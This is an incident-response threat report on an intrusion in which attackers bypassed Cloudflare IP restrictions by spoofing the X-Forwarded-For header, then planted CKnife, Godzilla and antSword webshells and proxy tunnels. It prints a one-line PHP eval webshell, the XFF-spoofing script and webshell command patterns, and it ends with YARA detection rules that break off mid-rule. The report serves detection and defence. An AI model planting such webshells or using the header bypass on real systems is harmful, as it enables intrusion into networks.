{
    "id": "025fcc40-211e-466c-9378-14f501323f48",
    "created_at": "2022-10-25T16:48:16.909384Z",
    "updated_at": "2025-03-27T02:17:16.783247Z",
    "deleted_at": null,
    "sha1_hash": "b67647c91154f8726891049665ec8cc293793b72",
    "title": "Backdoor via XFF – Mysterious Threat Actor Under Radar",
    "authors": "",
    "file_creation_date": "2022-06-14T16:57:29Z",
    "file_modification_date": "2022-06-14T16:57:29Z",
    "file_size": 797857,
    "plain_text": "# Backdoor via XFF\n\n### Mysterious Threat Actor Under Radar\n\nAuthors:\n\nCharles Lomboni\n\nVenkat Rajgor\n\nFelipe Duarte\n\nDate:\n\nJune 15, 2022\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n## Table of Contents\nBackdoor via XFF ........................................................................................................................... 1\n\nExecutive Summary .................................................................................................................... 3\n\nTechnical Details ........................................................................................................................ 5\n\nTimeline .................................................................................................................................. 5\n\nInitial Access ........................................................................................................................... 6\n\nPersistence & Command and Control .................................................................................. 8\n\nDiscovery & Lateral Movement .......................................................................................... 12\n\nTactics, Techniques, and Procedures ......................................................................................... 17\n\nRecommendations ....................................................................................................................... 18\n\nConclusions .................................................................................................................................. 18\n\nReferences .................................................................................................................................... 19\n\nAppendix – Yara rules ................................................................................................................. 20\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n#### Executive Summary\n\nOur incident response team caught a strange-looking Webshell activity on a server that\nwas running an internal web application. It raised many questions such as how the\nmalicious code was uploaded to the service if it is not exposed to the public internet and\nwhat was the vulnerability which allowed attackers to enter the server.\nWith assistance from our Red Team, we found that the attackers used a known bypass\ntechnique abusing the X-FORWARDED-FOR (XFF) HTTP header to manipulate Cloudflare\nbarriers, escape detection, and access a forbidden service that was supposed to be\nexposed only to a selected ranges of IP addresses.\n\nOnce the unrestricted access to the internal web application was obtained, it was just a\nmatter of time before they could find a critical vulnerability in one of the web forms.\nLacking proper input validation, the attackers found a vulnerability that allowed them to\nupload and execute a Chinese-linked Webshell named CKnife. Right after compromising the\nmachine, an additional set of tools containing different proxies and several Webshells was\nalso uploaded, giving them the ability to study the compromised network looking for new\nmachines that could potentially be exploited.\n\nAll the tools and scripts dropped by the threat actors had references to Chinese\ndevelopers and are well-known, especially among Red Teamers from that country.\nAccording to their functionality, these tools were divided into three main categories: Proxy\nclients, Webshells, and scripts.\n\n_Figure 1.Chinese red teaming toolkit used by threat actors in this intrusion._\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nEven though all the proxy clients have the same objective (to expose an internal asset to\ninternet), attackers used different tools for this purpose. It gave them more options during\nthe attack and enabled them to “pick & choose” tools based on the service they aimed to\nexpose. For the attack we witnessed the following tools were used: Neo-reGeorg, Simple\nPHP Proxy, Any-Proxy and GoAgent-PHP.\n\nFollowing the same redundancy strategy, attackers deployed three different Webshells to\ncompromise machines and keep covert, non-authorized access to the victim’s network. In\nthis case, the tools used to perform the attack were classified as Godzilla, antSword, and\nCKnife; All of which are very powerful tools, previously documented and widely used by\nChinese threat actors.\n\nOn top of that, attackers also used several scripts to speed up the network reconnaissance.\nAmong these scripts stood out a PHP file used to manipulate the X-FORWARDED-FOR\nHTTP header; This file was used as a middleman to allow access to additional internal\nresources. The rest of the scripts were a “copy & paste” from some Chinese programming\nforums and were meant to get basic information about the network configuration of a\ncompromised host.\n\nAfter investigating the logs of all compromised machines, we could conclude that the\nthreat actors were dormant in the network for a few weeks before being discovered, mainly\nanalyzing the internal web services. Once the file upload flaw was exploited, they quickly\nattempted to gain foothold by infecting additional servers in the same segment. We\nidentified the attempt to move laterally; Contained the attack and began the corresponding\ninvestigation.\n\nThis report drills down beyond the incident, the attackers, and indicators that can be used\nto detect and prevent such behavior. We are adding XFF security best practices to raise\nawareness around this bypass and the entire timeline to shed more light on this threat\nactor and get insights from readers regarding possible attribution.\n\nThe report in a nutshell:\n\n   - X-FORWARDED-FOR HTTP header manipulation used to bypass Cloudflare barriers and\naccess a restricted service.\n\n   - Critical vulnerability in an internal web application was exploited to get code execution.\n\n   - Chinese threat actor uses open-source projects to increase the attack surface and move\nlaterally.\n\n   - Proxy tools were used to expose the compromised infrastructure to the internet.\n\nFor more information about our incident response services, email:\nresponse@securityjoes.com\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n#### Technical Details\n\n###### Timeline\n\nThe attack began with an application which was prone to X-FORWARDED-FOR HTTP\nheader manipulation. It allowed drive-by attackers to abuse the mechanism and obtain\naccess to a restricted internal web service by changing the origin IP address in the request\nheader. This is a known technique usually used by Red Teamers for over a decade and is\nstill relevant nowadays[1]. This manipulation allowed the attackers to look inside the victim’s\nsystems until finding a vulnerable mechanism which enabled them to take advantage of a\nlack of a strong policy and install an open-source Chinese Webshell known as CKnife on\nthe compromised machine.\n\nAs observed by our team during this investigation, following the infection of the first\nmachine, attackers quickly dropped a set of tools containing mainly Chinese open-source\nprojects. This arsenal was then used to gather information from the compromised host and\nits surroundings; That helped them to find new targets before starting to spread over the\ninternal network, as described in figure 2.\n\n_Figure 2. Attack flow witnessed by the Security Joes Incident Response Team._\n\n1 https://www.intruder.io/research/practical-http-header-smuggling\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nIt is worth mentioning that all the tools used by the threat actor in this attack were\nidentified as Chinese open-source Red Team tools, which is an interesting characteristic\nthat clearly differentiates these attackers from any other group we had previously\nuncovered.\n\nIn the following sections, each of the tactics and techniques used by the threat actor\nduring the attack are explained with their corresponding details.\n\n###### Initial Access\n\nAfter a deep analysis of the backend application, we gained an understanding of what\nhappened in the “patient zero” server during this attack. We identified a weak\nimplementation in the X-FORWARDED-FOR validation. Due to this fact, attackers were\nallowed to craft a request using an internal IP in the X-FORWARDED-FOR HTTP header\n(which is a standard header for identifying the originating IP address of a client connecting\nto a web server through an HTTP proxy or a load balancer) and obtained access to an\ninternal web application. Once the unrestricted access was gained, attackers found a\nvulnerable web form and managed to upload a Webshell, impersonating an internal asset.\n\nIt is worth mention that all the systems affected during this attack were behind Cloudflare\nbarriers; Meaning that the attackers had to find the real IP address of these assets\nbeforehand.\n\nX-FORWARDED-FOR Misconfiguration\n\nAs discussed before, the application was designed to be used by the victim’s internal\nteams, which means that only authorized personnel whose IP would be present on\nCloudflare could have access to it. When anyone outside of this list tried to access the\napplication; A 403 Forbidden response code is returned to the user. Therefore, threat\nactors had to identify an internal authorized IP. An example of this logic is shown in the\nimage below.\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n_Figure 3. Steps taken by attackers to compromise victim’s servers by abusing the XFF HTTP header._\n\nTo understand the inner workings of this bypassing technique, it is important to clarify the\ngeneral usage of the X-FORWARDED-FOR HTTP header. By design, it contains the IP\naddress of a client that is connecting to a web server through a proxy[2]. This is especially\nuseful when an application is running behind a load balancer or any other kind of proxy\nserver. In such cases, if this header is not provided, the IP address seen by the application\nis the final IP of the proxy and not the real IP of the client.\n\nEven though this header is important when deploying a web service in a real production\nenvironment, a threat actor could also abuse it to bypass security controls and access\nprivate applications. For the intrusion described in this article, it was a Nginx instance\nwithout the proper security controls that allowed the attackers to spoof the internal IP\naddress and fool the mechanism responsible for filtering addresses that the request was\nsent originally from a trusted source.\n\n2 https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nNone or Non- GET /Login.aspx HTTP/2 HTTP/2 403 Forbidden\nauthorized IP Host: hosthere.com ..\n\n.. ..\n.. Server: cloudflare\n.. Cf-Ray: xxxxxxxxxxxx\n\n_Figure 4. Examples of HTTP GET requests to a targeted web app. If the IP address passed in the X-FORWARDED-FOR HTTP_\nheader (in red) is an authorized IP address with privileges to access the content in the server, the response code is 200 OK (in\n\n_green). If the value passed in the X-FORWARDED-FOR HTTP header is empty nor authorized, the response code is 403_\n\n_Forbidden (in purple)._\n\n###### Persistence & Command and Control\n\nFollowing the infection flow, right after exploiting the web application several different\ncommands were executed by the threat actor on the compromised servers. While analyzing\nthose commands, the pattern below was identified (Figure 5). In it, the echo-pwd-echo\nsequence was recognized as a characteristic behavior of a China Chopper-style Webshell.\n```\n  sh -c /bin/sh -c \"cd CURRENT_PATH;COMMAND;echo RANDOM_VALUE;PWD;ECHO RANDOM_VALUE\" 2>&1\n\n```\n_Figure 5. Suspicious pattern found in every command executed by Threat Actors during the intrusion._\n\nChina Chopper[3] is a Webshell management tool that allows attackers to easily manipulate\nand retain access to several infected systems from a single client-side application. It is an\ninfamous tool that has been used by some state-sponsored actors such as Leviathan,\nThreat Group-2290, and APT41 all of them known Chinese APT groups[4].\n\nAccording to the attacker’s profile (which mainly abuses Chinese open-source tools), we\nhighly suspect that the Webshell used during this attack was the open-source project\nCKnife[5]; see the image below.\n\n3 https://attack.mitre.org/software/S0020/\n4 https://www.cynet.com/attack-techniques-hands-on/china-chopper-observed-in-recent-ms-exchange-server-attacks/\n5 https://github.com/Chora10/Cknife\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n_Figure 6. Snippet of code found in the source-code of the CKnife Webshell that shows the pattern echo-pwd-echo found in the_\n\n_commands executed on every compromised asset._\n\nAside from its command-line pattern, China Chopper-like Webshells are known for the\nsmall code they require to run on an infected machine. With just a single line of code\nresponsible of interpreting the commands provided by attackers on run-time; It is possible\nto fully compromise an asset. Also, it provides support for different server-side languages,\nsuch as ASP.NET, PHP and Java. In this case, the infected server was running PHP, so the\nbase malicious code required to make this threat work is:\n```\n       <?php @eval($_POST['SOME_PARAMETER_NAME']); ?>\n\n```\n_Figure 7. Simplest PHP code needed in a victim’s server to have complete control of it via a China Chopper Webshell._\n\nIt is important to mention that even when the line of code required in the victim’s machine\nis super simple, it can be easily obfuscated, making its detection much more difficult.\n\nOnce threat actors got access to the victim’s infrastructure, they could carry out any\nactivity they desire, as an internal user. At this point, they dropped several tools to gather\nadditional information about the compromised environment, discover new vulnerable\nsystems and spread inside the network.\n\nAmong these new sets of tools dropped by the attackers, two additional Webshells were\ndiscovered. Although they were uploaded to the compromised assets, we found no\nevidence of them being actively used by the threat actor during the intrusion. We suspect\nthose additional Webshells were deployed just to increase the outreach of the attackers’\nfoothold in the victim’s infrastructure and to offer additional means to interact with the\ncompromised systems if such needed.\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nBelow each of these scripts is explained:\n\nFile 255b97b87394ec8f8a98367ead4d46beb7dbfe396ca05a1ec39244600\nname: 2c9c048.php\n\nThreat: Godzilla\nDescripti Godzilla is a Chinese Webshell that parses inbound HTTP POST requests,\non: decrypts its content with a hardcoded key, executes it and returns the\n\nresult also encrypted in the body of the HTTP response. The cryptographic\nalgorithm used to protect the network traffic between the compromised\nmachine and the attacker’s computer changes depending on the language\nin which the exploited application is running (see figure below). In cases\nwhere the application runs on top of C# or Java, the AES algorithm is\nused to encrypt communications, else a simple XOR encryption is\nperformed.\n\n\n_Figure 8. Cryptographic functions found in the source code of Godzilla Webshell. In case the victim’s_\n_machine runs CSharp or Java the AES algorithm is used; else a simple XOR algorithm is implemented._\n\nThis tool has been previously mentioned in several threat intelligence\nreports exposing cyber-attacks affecting Chinese companies. A notorious\nexample of this is the campaign exploiting a vulnerability in the\nManageEngine ADSelfService Plus service, that was documented by\nUnit42 on November, 2021[6].\n\n_Figure 9. Snippet of PHP code found on a compromised machine containing the simple XOR algorithm_\n\n_implemented by Godzilla to protect network traffic shared between the infected machine and the_\n\n_attackers._\n\n6 https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nFile 9762202401b6375a0ab99949b370d16c85743858d338fd9bba591ea\nname: dc9b66ce0.php\n\nThreat: antSword\nDescripti antSword is an open-source Webshell available on GitHub. It is a very\non: customizable tool, popular in the Chinese Red Teaming community.\n\nBy default, this tool does not implement any type of encryption or\nobfuscation to protect the network traffic shared between the attacker and\nthe victim’s machine, However the artifact found in one of the\ncompromised hosts during this intrusion contained a hardcoded public key\nin the body of the PHP script, which is a clear sign of an implementation of\nan asymmetric encryption algorithm to make the infection stealthier and\nharder to detect.\n\nThe above evidence was confirmed with the finding of a detailed guide\nwritten in Chinese and called “Create a perfect antSword from 0 to 1” by\nits author; That explains a step-by-step guide on how to modify the\noriginal antSword code to handle RSA encryption[7].\n\nIn addition to this, antSword has been actively used by threat actors to\nmaintain access in compromised networks after exploiting a variety of\nvulnerabilities such as the CVE-2019-0604 (affecting SharePoint in\nFebruary 2019); Reported by PaloAlto on September 10, 2019[8].\n\n_Figure 10. Snippet of code taken from the antSword found in a compromised server._\n\n_In it, the RSA public key._\n\n\nOne by one, threat actors were infecting, finding new devices, and moving to the next\ntarget. This cycle continued until it was successfully identified and stopped by our incident\nresponse team.\n\n7 https://xz.aliyun.com/t/6701\n8 https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n###### Discovery & Lateral Movement\n\nDuring this attack, threat actors used several scripts and tools to collect information about\nthe compromised system and the internal infrastructure. To accomplish it, attackers relied\non three scripts and four proxy tools. Below each of these tools is detailed.\n\n###### Scripts\n\nThree different scripts (Bash, Python and PHP) were used by the threat actor during the\nattack. Among all the scripts, it was only possible to get a copy of the PHP and two\ndifferent versions of the Python script. The Bash script was allegedly deleted by the\nattackers right after launching it and could not be recovered during the analysis.\n\nFile name: 1.py – version 1\nDescription: Simple Python script to execute the system command “ipconfig” and\n\nprint its response. This exact code was found in the following Chinese\nwebsites:\n\n1. www[.]it145[.]com\n2. www[.]moregeek[.]xyz\n3. cloud[.]tencent[.]com\n\nContent: `import os`\n```\n        a=os.popen(\"ipconfig\")\n        print(a.read())\n\n```\nFile name: 1.py – version 2\nDescription: Simple Python script to execute the system command “ping” pointing to\nan internal IP address and print its response. It also contains a Chinese\ncomment in the code; this comment was also found in all the forums\nwhere this code was shared. In this case, threat actors just copied and\npasted the code without any modification from any of the web sites\nlisted below:\n\n\n1. www[.]it145[.]com\n2. www[.]moregeek[.]xyz\n3. cloud[.]tencent[.]com\n\n\nContent: `import os`\n```\n       a=os.system(\"ping 192.168.1.101\") #使用a接收返回值\n       print(a)\n\n```\nFile name: pack.php\nDescription: This file was used for passing a custom header skipping the SSL\n\nverification of the certificate, the peer’s name and setting an internal IP\naddress in the XFF header. The screenshot below shows that when the\nfunction file_get_contents is called, stream_opts is passed as an array.\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nAccording to documentation, this function “reads an entire file passed as\nparameter into a string”. Due to this capability, an attacker could extract\nthe source code of any file they chose. We suspect with high certainty\nthat this script was the primary tool used by this threat actor to gain\naccess to the victim’s system while searching for the right attack vector.\nWe also suspect with medium certainty that this first step was taken by\nthe attacker to identify the vulnerable file upload mechanism.\nContent: `<?php`\n```\n        $stream_opts = [\n           \"ssl\" => [\n             \"verify_peer\"=>false,\n             \"verify_peer_name\"=>false,\n          ],\n           \"http\" => [\n             \"method\" => \"GET\",\n             \"header\" => \"X-Forwarded-For: XXX.XXX.XX.XX\"\n          ]\n        ]; \n        $response =\n        file_get_contents(\"http://XXX.XXX.XX.XX/\",false,\n        stream_context_create($stream_opts));\n        echo ($response);\n        ?>\n\n###### Proxy Tools\n\n```\nAside from previously described scripts, the threat actor also used four different proxy\ntools to expose the internal infrastructure to internet.\nAll the proxy tools used by threat actors in this attack are well-known and widely used in\nthe Chinese Red Teaming community. Each one of them offers its own advantages and\ndrawbacks, but more importantly, they allow attackers to “pick & choose” the best tool\naccording to their needs during each phase of the attack.\n\nAll the details of each of the proxy tools identified in this analysis are presented below:\n\nFile name: tunnel123.php\nThreat: Neo-reGeorg\nDescription: PHP file generated by the open-source project Neo-reGeorg. It enables\n\nattackers to use additional tools such Metasploit or Nmap to study and\npivot between machines inside an internal network through the proxy.\nOnce threat actors have established the connection with this tool, they\ncan use it to expose all the different assets inside the victims’ network to\nthe internet.\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nThis project offers two main functionalities, each one of them is\ndescribed below:\n\n  - Payload generation mode: It allows threat actors to dynamically\n\ngenerate obfuscated PHP code that must be manually uploaded\ninto the compromised server and will handle the victim-side logic\nof the tunnel.\n\n  - Tunnelling mode: It allows threat actors to interact with a\n\ncompromised machine by generating a SOCKS5 tunnel that could\neasily be used as a proxy to expose the internal infrastructure of\nthe victim.\n\nNeo-reGeorg and its variants have been used several times in notorious\nattacks previously documented. Most relevant cases could probably be\nthe Ransomware gang SamSam first seen in 2018 and described by\nSecureWorks[9], and the Russian APT28 who managed to install this tool\non a compromised Outlook Web Access (OWA) server[10].\n\n_Figure 11. Snippet of code of the neo-reGeorg proxy tool found on a compromised machine._\n\n_Variables are obfuscated to make the analysis more challenging._\n\n\nName: index.php\nThreat: GoAgent-PHP\nDescription: This tool in essence is used to build an IP proxy server. It expects only\ntwo types of HTTP methods - POST and GET. Nevertheless, if a GET is\ncalled – Due to its inner validation – The action taken either redirects to\nthe root domain itself or to a Google search bar. On the other hand, if a\n\n\n9 https://www.secureworks.com/research/samsam-ransomware-campaigns\n10 https://media.defense.gov/2021/Jul/01/2002753896/-1/1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nPOST request is chosen, the “magic” happens. The most relevant fact\nabout GoAgent-PHP is that PHP must have support with CURL or open\nremote files being enabled for it to work properly.\n\n_Figure 12. GoAgent-PHP snippet. Identical to the one on GitHub._\n\n\nName: index_all.php\nThreat Any-Proxy\nDescription: Any-Proxy is a reverse proxy based on another Chinese tool called\n\nReverse-Proxy-PHP[11]. It takes a client request, sends it to others proxied\nservers, fetches the response and delivers it to the client. We strongly\nbelieve that the attackers were using this tool to fog activity and extract\nsensitive information.\n\n11 https://github.com/koalabearguo/reverse-proxy-php\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n_Figure 13. Any-Proxy code snippet._\n\n\nFile name: reg.php\nThreat: Simple PHP Proxy\nDescription: The goal of this tool is to act as a direct network traffic between\n\nsystems. It can also act as an intermediary for network communications,\nsuch as command-and-control, to avoid direct connections to the\nvictim’s infrastructure. This tool was used for gathering information\nabout the network as part of the reconnaissance process.\n\n_Figure 14. Tools used by this threat actor were in general a copy & paste version from Github, this one_\n\n_has the same source code with the goal of helping the attacker avoid being detected throughout an_\n\n_intermediary communication_\n\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n#### Tactics, Techniques, and Procedures\n\nTactic ID Technique Tools / Details\n\nReconnaissance T1590.005 IP Address\n\nGather Victim Host\nReconnaissance T1592\nInformation host.\n\nExecution T1059.004 Unix Shell\n\nExecution T1059.006 Python\n\nExploitation for Client\nExecution T1203\nExecution\n\nPersistence T1505.003 Webshell\n\nFile and Directory\nDiscovery T1083\nDiscovery contents.\n\nNetwork Service\nDiscovery T1046\nDiscovery\n\nData from Local\nCollection T1005\nSystem\n\nC&C T1105 Ingress Tool Transfer\n\nC&C T1071.001 Web Protocols\ncommands.\n\nC&C T1572 Protocol Tunneling\n\nC&C T1573.001 [Symmetric ]\n\nCryptography\n\nAES encryption.\n\nC&C T1573.002 [Asymmetric ]\n\nCryptography\n\nduring the attack.\n\nThreat Intelligence & Incident Response Team\n\n|Tactic|ID|Technique|Tools / Details|\n|---|---|---|---|\n|Reconnaissance|T1590.005|IP Address|Gather the victim's IP addresses that can be used during an attack.|\n|Reconnaissance|T1592|Gather Victim Host Information|Gather information about the victim’s host.|\n|Execution|T1059.004|Unix Shell|Capable of running Bash script.|\n|Execution|T1059.006|Python|Capable of running Python script.|\n|Execution|T1203|Exploitation for Client Execution|Exploit a weak implementation from file upload component.|\n|Persistence|T1505.003|Webshell|The actor used a modified and obfuscated version of the Neo-reGeorg Webshell and CKnife.|\n|Discovery|T1083|File and Directory Discovery|The component can list directory contents.|\n|Discovery|T1046|Network Service Discovery|The component can spider authentication portals.|\n|Collection|T1005|Data from Local System|Ability to upload local files.|\n|C&C|T1105|Ingress Tool Transfer|Ability to download remote files.|\n|C&C|T1071.001|Web Protocols|Execute code sent via HTTP POST commands.|\n|C&C|T1572|Protocol Tunneling|Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.|\n|C&C|T1573.001|Symmetric Cryptography|Godzilla was used in this attack and went successfully under radar using AES encryption.|\n|C&C|T1573.002|Asymmetric Cryptography|antSword was found with a hardcode RSA public key used to encrypt traffic during the attack.|\n\n\n-----\n\n#### Recommendations\n\nThe attack started with an initial finding of internal IP being abused by the attackers even\nthough being behind Cloudflare. Following that step, the threat actor crafted a request\nusing this IP to gain unrestricted access to by exploiting a weak configurations of the XFF\nheader. To avoid that, a good practice is to disable the XFF. Using an XFF header is\nuntrustworthy. Mozilla developers’ website gives a good explanation about how dangerous\nit is to have this header enabled.\n\n“If the server is directly connectable from the internet – even if it is also behind a trusted\nreverse proxy – no part of the X-FORWARDED-FOR IP list can be considered trustworthy or\nsafe for security-related uses.”[12]\n\nAn Arbitrary File Upload is a type of vulnerability that allows an attacker to upload\nmalicious formats of files in order to execute server-side code instead of the original\nintension of the mechanism (for example, uploading a photo). To prevent this from\nhappening, the mechanism should be inspected against known vulnerabilities. In addition,\nevery externally controlled parameter should go through validation and the uploaded files\nshould reside on an external resource (for example, an S3 bucket).\n\n#### Conclusions\n\nAt this point we have been observed many files related to a Chinese threat actor. The main\nWebshell found was CKnife which is a China Chopper Webshell clone sided with many\ntools used. The common denominator of all those tools is their origin, Chinese comments\nand other indicators that points on a Chinese-speaking threat actor we could not identify\nclearly. Several tools used in the toolkit offered the attacker a unique opportunity to avoid\ndetection by using symmetric encryption algorithms such as AES for network traffic,\npersistence mode, reconnaissance, lateral movement, and so forth. Thus, it allows\nmaintaining a very low static detection rate.\n\n12 https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For#selecting_an_ip_address\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n#### References\n\n  - [https://news.softpedia.com/news/new-made-in-china-web-shell-threatens-the-security-of-web-](https://news.softpedia.com/news/new-made-in-china-web-shell-threatens-the-security-of-web-servers-worldwide-506448.shtml)\n[servers-worldwide-506448.shtml](https://news.softpedia.com/news/new-made-in-china-web-shell-threatens-the-security-of-web-servers-worldwide-506448.shtml)\n\n  - [https://github.com/Chora10/CKnife](https://github.com/Chora10/Cknife)\n\n  - [https://blog.talosintelligence.com/2019/08/china-chopper-still-active-9-years-later.html?m=1](https://blog.talosintelligence.com/2019/08/china-chopper-still-active-9-years-later.html?m=1)\n\n  - [https://attack.mitre.org/software/S0020/](https://attack.mitre.org/software/S0020/)\n\n  - [https://gitee.com/atwal/php-simple-proxy/blob/master/simple_proxy.php](https://gitee.com/atwal/php-simple-proxy/blob/master/simple_proxy.php)\n\n  - [https://github.com/cowboy/php-simple-proxy/](https://github.com/cowboy/php-simple-proxy/)\n\n  - https://github.com/bclswl0827/goagent-php/blob/master/index.php\n\n  - [https://attack.mitre.org/techniques/T1090/](https://attack.mitre.org/techniques/T1090/)\n\n  - [https://www.php.net/manual/en/function.file-get-contents.php](https://www.php.net/manual/en/function.file-get-contents.php)\n\n  - [https://www.php.net/manual/en/context.ssl.php](https://www.php.net/manual/en/context.ssl.php)\n\n  - [https://github.com/yitd/Any-Proxy](https://github.com/yitd/Any-Proxy)\n\n  - [https://github.com/BeichenDream/Godzilla](https://github.com/BeichenDream/Godzilla)\n\n  - [https://www.secureworks.com/research/samsam-ransomware-campaigns](https://www.secureworks.com/research/samsam-ransomware-campaigns)\n\n  - [https://media.defense.gov/2021/Jul/01/2002753896/-1/-](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)\n[1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)\n\n  - [https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/](https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/)\n\n  - [https://www.mandiant.com/resources/the-little-malware-that-could-detecting-and-defeating-the-](https://www.mandiant.com/resources/the-little-malware-that-could-detecting-and-defeating-the-china-chopper-web-shell)\n[china-chopper-web-shell](https://www.mandiant.com/resources/the-little-malware-that-could-detecting-and-defeating-the-china-chopper-web-shell)\n\n  - [https://www.it145.com/9/79439.html](https://www.it145.com/9/79439.html)\n\n  - [https://www.moregeek.xyz/i/502400954959](https://www.moregeek.xyz/i/502400954959)\n\n  - [https://cloud.tencent.com/developer/article/1757147](https://cloud.tencent.com/developer/article/1757147)\n\n  - [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For#security_and_privacy_concerns)\n[For#security_and_privacy_concerns](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For#security_and_privacy_concerns)\n\n  - [https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/](https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/)\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n#### Appendix – Yara rules\n```\n rule neo_regeorg_proxy {\n   meta:\n     author = \"Charles Lomboni - Security Joes\"\n     description = \"Rules to detect neo-reGeorg proxy tool\"\n     date = \"June, 2022\"\n     reference = \"https://github.com/L-codes/Neo-reGeorg\"\n   strings:\n     $neo_regeorg_en = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n     $neo_regeorg_de = \"BASE64 CHARSLIST\"\n     $neo_regeorg_cmd = \"X-CMD\"\n     $neo_regeorg_target = \"X-TARGET\"\n     $neo_regeorg_error = \"X-ERROR\"\n     $neo_regeorg_status = \"X-STATUS\"\n     $neo_regeorg_phrase = \"Georg says, 'All seems fine'\"   \n     $neo_pass_php_1 = \"if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);\"\n     $neo_pass_php_2 = \"$mark = substr($cmd,0,22);\"\n     $neo_pass_php_3 = \"$cmd = substr($cmd, 22);\"\n     $neo_pass_php_4 = \"$writebuf = \\\"writebuf\\\".$mark;\"\n     $neo_pass_php_5 = \"$readbuf = \\\"readbuf\\\".$mark;\"\n     $neo_pass_php_6 = \"$target_ary = explode(\\\"|\\\", base64_decode(strtr($headers[\"\n     $neo_pass_php_7 = \"$_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));\"\n     $neo_pass_jspx_1 = \"<jsp:root version=\\\"2.0\\\" \n mlns:jsp=\\\"http://java.sun.com/JSP/Page\\\"><jsp:directive.page\n contentType=\\\"text/html\\\"/><jsp:directive.page pageEncoding=\\\"UTF-8\\\"\n trimDirectiveWhitespaces=\\\"true\\\"/>\"\n     $neo_pass_jspx_2 = \"return super.defineClass(b, 0, b.length);\"\n     $neo_pass_jspx_3 = \"Class clazz = new U(this.getClass().getClassLoader()).g(clazzBytes);\"\n     $neo_pass_jsp_1 = \"<%@page pageEncoding=\\\"UTF-8\\\" trimDirectiveWhitespaces=\\\"true\\\"%>\"\n     $neo_pass_aspx_1 = \"public String StrTr(string input, string frm, string to) {\"\n     $neo_pass_aspx_2 = \"String en =\n \\\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\\\";\"\n     $neo_pass_aspx_3 = \"Uri u = new\n Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(StrTr(rUrl, de, en))));\"\n     $neo_pass_aspx_4 = \"request.Headers.Add(key, Request.Headers.Get(key));\"\n     $neo_pass_aspx_5 = \"if((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0) {\"\n     $neo_pass_aspx_6 = \"String mark = cmd.Substring(0,22);\"\n     $neo_pass_aspx_7 = \"String target_str =\n System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(Request.Headers.Get(\"\n   condition:\n     ($neo_regeorg_en and $neo_regeorg_de and $neo_regeorg_cmd and $neo_regeorg_target and\n $neo_regeorg_error and $neo_regeorg_status and $neo_regeorg_phrase)\n     or ($neo_pass_php_1 and $neo_pass_php_2 and $neo_pass_php_3 and $neo_pass_php_4 and\n $neo_pass_php_5 and $neo_pass_php_6 and $neo_pass_php_7)\n     or (($neo_pass_jspx_1 or $neo_pass_jsp_1) and $neo_pass_jspx_2 and $neo_pass_jspx_3)\n     or ($neo_pass_aspx_1 and $neo_pass_aspx_2 and $neo_pass_aspx_3 and $neo_pass_aspx_4 and\n $neo_pass_aspx_5 and $neo_pass_aspx_6 and $neo_pass_aspx_7)\n }\n rule cknife_webshell {\n   meta:\n     author = \"Charles Lomboni - Security Joes\"\n     description = \"Rules to detect CKnife web shell\"\n     date = \"June, 2022\"\n     reference = \"https://github.com/Chora10/Cknife\"\n   strings:\n     $cknife_cd_cmd = \"&echo [S]&cd&echo [E]\"\n     $cknife_pwd_bin_sh = \";echo [S];pwd;echo [E]\"\n     $cknife_cmd = \"cmd\"\n     $cknife_bin_sh = \"/bin/sh\"\n     $cknife_cmd_comment = {2f 2f e6 a3 80 e6 9f a5 63 6d 64 e6 98 af e5 90 a6 e6 9c 89 e8 87 aa e5\n\n```\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n```\nae 9a e4 b9 89 e8 b7 af e5 be 84}\n    $cknife_windows_comment = {2f 2f 20 77 69 6e 64 6f 77 73 e7 b3 bb e7 bb 9f}\n    $cknife_to_hex_comment = {2f 2f 20 31 36 e8 bf 9b e5 88 b6 20 e8 bd 